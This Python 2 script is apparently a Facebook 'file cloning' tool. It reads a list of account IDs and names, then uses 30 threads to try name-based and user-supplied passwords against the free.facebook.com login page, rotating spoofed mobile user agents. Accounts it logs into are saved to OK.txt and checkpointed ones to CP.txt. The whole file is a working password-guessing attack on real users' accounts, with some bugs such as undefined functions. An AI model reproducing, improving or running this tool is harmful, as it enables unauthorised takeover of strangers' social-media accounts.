#-*-coding:utf-8-*-


import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
 
host="https://free.facebook.com"

us = [
'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 7.0; A7Pro Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; LG-H870 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; RMX1971 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ Opera/7.1'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]'
'Mozilla/5.0 (Windows NT 10.0; OPPSS :)64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
]

logo =                                          """
#add your logo 

"""
host="https://free.facebook.com"

def main():
    os.system("clear")
    logo()
    print(" \x1b[1;97m    \tWellcome To File Cloning")
    print("\x1b[1;97m------------------------------------------------")
    print(" \x1b[1;97m     [1] Enter Tool Menu\n")
    print(" \x1b[1;97m     [0] Back To Main Tool\n")
    print("\x1b[1;97m------------------------------------------------")
    log_sel()
def log_sel():
	sel = raw_input('\x1b[1;97mChose--->')
	if sel =="1":
		menu()
	if sel =="0":
		os.system('python2 All-in1.py')
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()


def menu():
    os.system('clear')
    logo()
    print("\x1b[1;97m------------------------------------------------")
    print '\x1b[1;97m[1] Crack auto pass'
    print '\x1b[1;97m]2] Crack choice password'
    print '\x1b[1;97m[0] Back To main Tool'
    print("\x1b[1;97m------------------------------------------------")
    menu_option()
    
def menu_option():
	select = raw_input('\x1b[1;97m Chose--->')
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		name()
	elif select =="0":
		os.system("python2 All-in1.py")
		
		
	else:
		print("\tSelect valid option")
		menu_option()

def crack():
	os.system("clear")
	logo()
	print("\x1b[1;97m------------------------------------------------")
	print '\x1b[1;97m[1] Crack File'
	print '\x1b[1;97m[0] Back'
	print("\x1b[1;97m------------------------------------------------")
	crack_select()
def crack_select():
	select = raw_input('\x1b[1;97m Chose--->')
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print 
		filelist = raw_input('\x1b[1;97m Enter File name : ')
		os.system("clear")
		logo()
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37mRequested file not found\033[0;98m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;97m------------------------------------------------")
	print(" Use flight mode After every 5 mint if no result")
	print("\x1b[1;97m------------------------------------------------")
	print '\x1b[1;97m[÷] Total File Accounts : ' + str(len(id))
	print("\x1b[1;97m[÷] Process has Started")
	print("\x1b[1;97m[÷] Press ctrl + z to stop")
	print ''
	print("\x1b[1;97m------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://free.facebook.com"
		try:
			ps1 = name.lower().split(' ')[0] + name.lower().split(' ')[1] + '786'
			data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps1, 'login': 'submit'})
			sp = data.content
			if 'free_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [OK] '+uid+' | '+ps1+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps1+'\n')
				ok.close()
				oks.append(uid+ps1)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;97m [CP] '+uid+' | '+ps1+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps1+'\n')
					cp.close()
					cps.append(uid+ps1)
				else:
					ps2 = name.lower()
					data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'free_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;97m [CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name.lower().split(' ')[1] + '786'
							data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'free_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;97m [CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = name.lower().split(' ')[0] + name.lower().split(' ')[1] + '123'
									data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'free_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;97m [CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
											data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'free_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;97m [CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)

		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	raw_input("\x1b[1;97mPress enter to back Menu ")
	menu()
def choice():
	os.system("clear")
	logo()
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;91m [1]\x1b[1;97m Crack File \x1b[1;90m   [5  Pass]")
	print("\x1b[1;97m-----------------------------------------------------")
	choice_select()
def choice_select():
	select = raw_input("\x1b[1;97mChoose ---> ")
	id=[]
	oks=[]
	cps=[]

	if select =="1":
		os.system("clear")
		logo()
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;91m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;91m[!]\x1b[1;97m Password5: ")
		os.system("clear")
		logo()
		filelist = raw_input('\x1b[1;97m(\x1b[1;97m+\x1b[1;97m) Input File name : ')
		os.system("clear")
		logo()
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()

	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;97m------------------------------------------------")
	print(" \tUse flight mode if no result")
	print("\x1b[1;97m------------------------------------------------")
	print '\x1b[1;97m[÷] Total File Accounts : ' + str(len(id))
	print("\x1b[1;97m[÷] Process has Been Started")
	print(" \x1b[1;97m[÷] Press ctrl + z to stop")
	print ''
	print 47 * '\x1b[1;98m\xe2\x95\x90'
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://free.facebook.com"
		try:
			data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'free_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m (OK) '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;97m (CP) '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'free_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m (OK) '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;97m (CP) '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'free_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m (OK) '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;97m (CP) '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'free_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m (OK) '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;97m (CP) '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											data = session.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'free_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m (OK) '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;97m (CP) '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)

		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m-----------------------------------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m-----------------------------------------------------")
	raw_input("\x1b[1;91m[!]\x1b[1;97mPress enter to back Menu ")
	menu()
	
	
if __name__ == '__main__':
	main()
